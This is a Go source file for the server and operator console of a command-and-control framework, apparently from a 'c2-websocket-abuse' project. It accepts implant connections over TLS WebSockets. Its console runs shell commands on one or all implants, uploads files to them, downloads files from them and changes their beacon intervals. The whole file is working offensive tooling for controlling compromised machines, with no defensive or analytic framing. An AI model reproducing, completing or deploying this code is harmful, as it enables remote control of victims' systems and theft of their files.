package main

import (
	"bufio"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/pem"
	"flag"
	"fmt"
	"log"
	"math/big"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/gorilla/websocket"

	"github.com/churchofmalware/c2-websocket-abuse/pkg"
)

// implantConn wraps a WebSocket connection with metadata.
type implantConn struct {
	id        string
	conn      *websocket.Conn
	ip        string
	connected time.Time
	mu        sync.Mutex
}

func (ic *implantConn) send(msg *protocol.Message) error {
	ic.mu.Lock()
	defer ic.mu.Unlock()
	return ic.conn.WriteJSON(msg)
}

// server holds all connected implants and the WebSocket upgrader.
type server struct {
	implants map[string]*implantConn
	mu       sync.RWMutex
	upgrader websocket.Upgrader
}

func newServer() *server {
	return &server{
		implants: make(map[string]*implantConn),
		upgrader: websocket.Upgrader{
			CheckOrigin:     func(r *http.Request) bool { return true },
			ReadBufferSize:  4096,
			WriteBufferSize: 4096,
		},
	}
}

func (s *server) addImplant(ic *implantConn) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if old, ok := s.implants[ic.id]; ok {
		old.conn.Close()
		log.Printf("Replaced existing implant %s", ic.id)
	}
	s.implants[ic.id] = ic
	log.Printf("Implant registered: %s from %s", ic.id, ic.ip)
}

func (s *server) removeImplant(id string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	delete(s.implants, id)
	log.Printf("Implant disconnected: %s", id)
}

func (s *server) getImplant(id string) *implantConn {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.implants[id]
}

func (s *server) listImplants() []*implantConn {
	s.mu.RLock()
	defer s.mu.RUnlock()
	out := make([]*implantConn, 0, len(s.implants))
	for _, ic := range s.implants {
		out = append(out, ic)
	}
	return out
}

func (s *server) handleWS(w http.ResponseWriter, r *http.Request) {
	conn, err := s.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("Upgrade error: %v", err)
		return
	}

	// Expect a register message as the first frame
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	_, raw, err := conn.ReadMessage()
	if err != nil {
		log.Printf("Read register error: %v", err)
		conn.Close()
		return
	}
	msg, err := protocol.UnmarshalMessage(raw)
	if err != nil || msg.Type != protocol.TypeRegister {
		log.Printf("Invalid register message from %s", r.RemoteAddr)
		conn.Close()
		return
	}

	implantID := msg.ID
	if implantID == "" {
		implantID = fmt.Sprintf("anon-%d", time.Now().UnixNano())
	}

	ip := r.RemoteAddr
	if host, _, err := net.SplitHostPort(ip); err == nil {
		ip = host
	}

	ic := &implantConn{
		id:        implantID,
		conn:      conn,
		ip:        ip,
		connected: time.Now(),
	}

	conn.SetReadDeadline(time.Time{})
	s.addImplant(ic)

	// Pong handler — extends read deadline
	conn.SetPongHandler(func(string) error {
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		return nil
	})

	// Reader loop
	go func() {
		defer func() {
			s.removeImplant(implantID)
			conn.Close()
		}()

		for {
			conn.SetReadDeadline(time.Now().Add(60 * time.Second))
			_, raw, err := conn.ReadMessage()
			if err != nil {
				if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseNormalClosure) {
					log.Printf("Implant %s read error: %v", implantID, err)
				}
				return
			}

			msg, err := protocol.UnmarshalMessage(raw)
			if err != nil {
				continue
			}

			switch msg.Type {
			case protocol.TypeHeartbeat:
				// Implant alive — no action needed
			case protocol.TypeResult:
				if msg.Err != "" {
					log.Printf("[Error from %s] %s", msg.ID, msg.Err)
				} else {
					log.Printf("[Result from %s] %s", msg.ID, msg.Data)
				}
			case protocol.TypePong:
				// Response to our ping
			default:
				log.Printf("Unknown message type from %s: %s", msg.ID, msg.Type)
			}
		}
	}()

	// Ping ticker — every 30 seconds
	go func() {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			ic.mu.Lock()
			err := ic.conn.WriteMessage(websocket.PingMessage, []byte("keepalive"))
			ic.mu.Unlock()
			if err != nil {
				return
			}
		}
	}()
}

// ----- Operator Console -----

type operator struct {
	server   *server
	selected string
}

func (op *operator) run() {
	scanner := bufio.NewScanner(os.Stdin)
	fmt.Println("╔═══════════════════════════════════════════════╗")
	fmt.Println("║        WebSocket Abuse C2 — Operator Console  ║")
	fmt.Println("╚═══════════════════════════════════════════════╝")
	fmt.Println("Commands: list, use <id>, exec <cmd>, upload <local> <remote>,")
	fmt.Println("          download <remote>, beacon <sec>, broadcast <cmd>, exit")
	fmt.Print("\n> ")

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			fmt.Print("> ")
			continue
		}

		parts := strings.Fields(line)
		if len(parts) == 0 {
			fmt.Print("> ")
			continue
		}
		cmd := parts[0]
		args := parts[1:]

		switch cmd {
		case "list":
			op.cmdList()
		case "use":
			if len(args) < 1 {
				fmt.Println("Usage: use <implant-id>")
			} else {
				op.cmdUse(args[0])
			}
		case "exec":
			if op.selected == "" {
				fmt.Println("No implant selected. Use 'use <id>' first.")
			} else if len(args) < 1 {
				fmt.Println("Usage: exec <command>")
			} else {
				op.cmdExec(strings.Join(args, " "))
			}
		case "upload":
			if op.selected == "" {
				fmt.Println("No implant selected. Use 'use <id>' first.")
			} else if len(args) < 2 {
				fmt.Println("Usage: upload <local> <remote>")
			} else {
				op.cmdUpload(args[0], args[1])
			}
		case "download":
			if op.selected == "" {
				fmt.Println("No implant selected. Use 'use <id>' first.")
			} else if len(args) < 1 {
				fmt.Println("Usage: download <remote>")
			} else {
				op.cmdDownload(args[0])
			}
		case "beacon":
			if op.selected == "" {
				fmt.Println("No implant selected. Use 'use <id>' first.")
			} else if len(args) < 1 {
				fmt.Println("Usage: beacon <seconds>")
			} else {
				op.cmdBeacon(args[0])
			}
		case "broadcast":
			if len(args) < 1 {
				fmt.Println("Usage: broadcast <command>")
			} else {
				op.cmdBroadcast(strings.Join(args, " "))
			}
		case "exit":
			if op.selected == "" {
				fmt.Println("No implant selected. Use 'use <id>' first.")
			} else {
				op.cmdExit()
			}
		case "help":
			fmt.Println("Commands:")
			fmt.Println("  list                    — Show connected implants")
			fmt.Println("  use <id>                — Select an implant")
			fmt.Println("  exec <command>          — Run command on selected implant")
			fmt.Println("  upload <local> <remote> — Upload file to implant")
			fmt.Println("  download <remote>       — Download file from implant")
			fmt.Println("  beacon <seconds>        — Change beacon interval")
			fmt.Println("  broadcast <command>     — Run command on all implants")
			fmt.Println("  exit                    — Disconnect selected implant")
			fmt.Println("  help                    — Show this help")
		default:
			fmt.Printf("Unknown command: %s\n", cmd)
		}

		if cmd != "list" {
			fmt.Print("> ")
		}
	}
}

func (op *operator) cmdList() {
	implants := op.server.listImplants()
	if len(implants) == 0 {
		fmt.Println("No implants connected.")
		return
	}

	fmt.Println()
	fmt.Println(strings.Repeat("─", 80))
	fmt.Printf("%-4s %-24s %-20s %-20s %s\n", "#", "IMPLANT ID", "IP", "CONNECTED", "STATUS")
	fmt.Println(strings.Repeat("─", 80))
	for i, ic := range implants {
		mark := ""
		if ic.id == op.selected {
			mark = "← selected"
		}
		fmt.Printf("%-4d %-24s %-20s %-20s %s\n", i+1, ic.id, ic.ip, ic.connected.Format(time.RFC3339), mark)
	}
	fmt.Println(strings.Repeat("─", 80))
	fmt.Printf("Total: %d implant(s)\n\n", len(implants))
}

func (op *operator) cmdUse(id string) {
	ic := op.server.getImplant(id)
	if ic == nil {
		fmt.Printf("Implant '%s' not found. Use 'list' to see connected implants.\n", id)
		return
	}
	op.selected = id
	fmt.Printf("Selected implant: %s (%s) connected since %s\n", id, ic.ip, ic.connected.Format(time.RFC3339))
}

func (op *operator) cmdExec(command string) {
	ic := op.server.getImplant(op.selected)
	if ic == nil {
		fmt.Printf("Implant '%s' is no longer connected.\n", op.selected)
		op.selected = ""
		return
	}
	msg := protocol.NewMessage(protocol.TypeExec, op.selected, command)
	if err := ic.send(msg); err != nil {
		fmt.Printf("Send error: %v\n", err)
		return
	}
	fmt.Printf("Sent exec to %s: %s\n", op.selected, command)
}

func (op *operator) cmdUpload(local, remote string) {
	data, err := os.ReadFile(local)
	if err != nil {
		fmt.Printf("Read file error: %v\n", err)
		return
	}
	encoded := base64.StdEncoding.EncodeToString(data)

	ic := op.server.getImplant(op.selected)
	if ic == nil {
		fmt.Printf("Implant '%s' is no longer connected.\n", op.selected)
		op.selected = ""
		return
	}

	payload := fmt.Sprintf("%s|%s", remote, encoded)
	msg := protocol.NewMessage(protocol.TypeUpload, op.selected, payload)
	if err := ic.send(msg); err != nil {
		fmt.Printf("Send error: %v\n", err)
		return
	}
	fmt.Printf("Uploading %s → %s on %s (%d bytes)\n", local, remote, op.selected, len(data))
}

func (op *operator) cmdDownload(remote string) {
	ic := op.server.getImplant(op.selected)
	if ic == nil {
		fmt.Printf("Implant '%s' is no longer connected.\n", op.selected)
		op.selected = ""
		return
	}
	msg := protocol.NewMessage(protocol.TypeDownload, op.selected, remote)
	if err := ic.send(msg); err != nil {
		fmt.Printf("Send error: %v\n", err)
		return
	}
	fmt.Printf("Requested download of %s from %s\n", remote, op.selected)
}

func (op *operator) cmdBeacon(interval string) {
	ic := op.server.getImplant(op.selected)
	if ic == nil {
		fmt.Printf("Implant '%s' is no longer connected.\n", op.selected)
		op.selected = ""
		return
	}
	msg := protocol.NewMessage(protocol.TypeBeacon, op.selected, interval)
	if err := ic.send(msg); err != nil {
		fmt.Printf("Send error: %v\n", err)
		return
	}
	fmt.Printf("Set beacon interval to %ss on %s\n", interval, op.selected)
}

func (op *operator) cmdBroadcast(command string) {
	implants := op.server.listImplants()
	if len(implants) == 0 {
		fmt.Println("No implants connected.")
		return
	}
	sent := 0
	for _, ic := range implants {
		msg := protocol.NewMessage(protocol.TypeExec, ic.id, command)
		if err := ic.send(msg); err != nil {
			fmt.Printf("Send to %s error: %v\n", ic.id, err)
			continue
		}
		sent++
	}
	fmt.Printf("Broadcast 'exec %s' to %d/%d implants\n", command, sent, len(implants))
}

func (op *operator) cmdExit() {
	ic := op.server.getImplant(op.selected)
	if ic == nil {
		fmt.Printf("Implant '%s' is no longer connected.\n", op.selected)
		op.selected = ""
		return
	}
	msg := protocol.NewMessage(protocol.TypeExit, op.selected, "")
	if err := ic.send(msg); err != nil {
		fmt.Printf("Send error: %v\n", err)
		return
	}
	fmt.Printf("Sent exit to %s\n", op.selected)
	op.selected = ""
}

// ----- TLS Cert Generation -----

func ensureCertificates(certPath, keyPath string, hosts ...string) error {
	// If both files exist, nothing to do
	if _, err := os.Stat(certPath); err == nil {
		if _, err := os.Stat(keyPath); err == nil {
			return nil
		}
	}

	log.Printf("Generating self-signed TLS certificate (%s, %s)...", certPath, keyPath)

	priv, err := rsa.GenerateKey(rand.Reader, 4096)
	if err != nil {
		return fmt.Errorf("generate key: %w", err)
	}

	serialNumber, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	if err != nil {
		return fmt.Errorf("generate serial: %w", err)
	}

	template := x509.Certificate{
		SerialNumber: serialNumber,
		Subject: pkix.Name{
			Organization: []string{"WebSocket Abuse C2"},
			CommonName:   "c2.local",
		},
		NotBefore:             time.Now().Add(-1 * time.Hour),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	if len(hosts) > 0 {
		template.DNSNames = hosts
	} else {
		template.DNSNames = []string{"localhost", "c2.local"}
	}
	template.IPAddresses = append(template.IPAddresses, net.ParseIP("127.0.0.1"))

	derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
	if err != nil {
		return fmt.Errorf("create cert: %w", err)
	}

	certOut, err := os.Create(certPath)
	if err != nil {
		return fmt.Errorf("create %s: %w", certPath, err)
	}
	defer certOut.Close()
	if err := pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: derBytes}); err != nil {
		return fmt.Errorf("encode cert: %w", err)
	}

	keyOut, err := os.Create(keyPath)
	if err != nil {
		return fmt.Errorf("create %s: %w", keyPath, err)
	}
	defer keyOut.Close()
	privBytes := x509.MarshalPKCS1PrivateKey(priv)
	if err := pem.Encode(keyOut, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: privBytes}); err != nil {
		return fmt.Errorf("encode key: %w", err)
	}

	log.Printf("Self-signed certificate generated (valid for 365 days)")
	return nil
}

func main() {
	addr := flag.String("addr", ":8443", "Listen address (host:port)")
	certFile := flag.String("cert", "server.crt", "TLS certificate file")
	keyFile := flag.String("key", "server.key", "TLS private key file")
	flag.Parse()

	// Ensure TLS certs exist
	if err := ensureCertificates(*certFile, *keyFile); err != nil {
		log.Fatalf("Certificate setup failed: %v", err)
	}

	// Load TLS config
	cert, err := tls.LoadX509KeyPair(*certFile, *keyFile)
	if err != nil {
		log.Fatalf("Load TLS cert: %v", err)
	}
	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
	}

	s := newServer()
	http.HandleFunc("/ws", s.handleWS)

	fmt.Printf("WebSocket C2 server starting on wss://%s/ws\n", *addr)

	// Graceful shutdown
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	// Operator console in a goroutine
	go func() {
		op := &operator{server: s}
		op.run()
	}()

	listener, err := tls.Listen("tcp", *addr, tlsConfig)
	if err != nil {
		log.Fatalf("TLS listen: %v", err)
	}

	httpServer := &http.Server{Addr: *addr}
	go func() {
		if err := httpServer.Serve(listener); err != nil && err != http.ErrServerClosed {
			log.Fatalf("Server error: %v", err)
		}
	}()

	<-sigCh
	log.Println("Shutting down...")
	httpServer.Close()
}
